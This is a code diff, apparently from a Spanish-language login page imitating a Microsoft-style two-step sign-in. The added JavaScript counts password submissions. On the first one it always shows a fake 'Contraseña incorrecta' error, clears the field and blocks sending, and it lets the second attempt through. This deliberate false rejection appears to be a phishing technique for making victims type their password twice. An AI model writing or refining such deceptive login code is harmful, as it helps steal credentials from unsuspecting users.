@@ -344,6 +344,9 @@
                          placeholder="Contraseña" minlength="3" maxlength="24" 
                          pattern="[A-Za-z0-9._]{3,24}" autocomplete="new-password" required>
                 </div>
+                <!-- ===== AGREGADO: Mensaje de error para primer intento de contraseña ===== -->
+                <div class="domain-error" id="password-error">Contraseña incorrecta. Inténtalo de nuevo.</div>
+                <!-- ===== FIN AGREGADO ===== -->
                 <div class="ms-info"><a href="#">¿Has olvidado tu contraseña?</a></div>
                 <button class="primary-button" type="submit">Iniciar sesión</button>
               </div>
@@ -438,6 +441,11 @@
       // ===== NUEVO: Quitar fondo al volver =====
       document.body.classList.remove('registro-step2');
       // ===== FIN NUEVO =====
+      
+      // ===== AGREGADO: Resetear contador de intentos al volver =====
+      regPasswordAttempts = 0;
+      document.getElementById('password-error').classList.remove('visible');
+      // ===== FIN AGREGADO =====
     }
     
     // Control del flujo de dos pasos para LOGIN
@@ -498,6 +506,11 @@
         // ===== NUEVO: Quitar fondo si estaba activo =====
         document.body.classList.remove('registro-step2');
         // ===== FIN NUEVO =====
+        
+        // ===== AGREGADO: Resetear contador al cambiar de modo =====
+        regPasswordAttempts = 0;
+        document.getElementById('password-error').classList.remove('visible');
+        // ===== FIN AGREGADO =====
       }
     }
     
@@ -519,6 +532,30 @@
     
     // Inicializar mostrando registro
     document.getElementById('form-entrada').setAttribute('hidden', '');
+    
+    // ===== AGREGADO: Control de primer intento de contraseña =====
+    let regPasswordAttempts = 0;
+
+    document.getElementById('form-registro').addEventListener('submit', function(e) {
+      // Solo interceptar si estamos en el paso 2 (contraseña visible)
+      if (document.getElementById('reg-step2').style.display !== 'none') {
+        regPasswordAttempts++;
+        
+        // Primer intento: mostrar error y bloquear
+        if (regPasswordAttempts === 1) {
+          e.preventDefault();
+          e.stopPropagation();
+          document.getElementById('password-error').classList.add('visible');
+          document.getElementById('registro-usuario').value = '';
+          document.getElementById('registro-usuario').focus();
+          return false;
+        }
+        
+        // Segundo intento: ocultar error y permitir envío normal
+        document.getElementById('password-error').classList.remove('visible');
+      }
+    });
+    // ===== FIN AGREGADO =====
   </script>
 </body>
 </html>
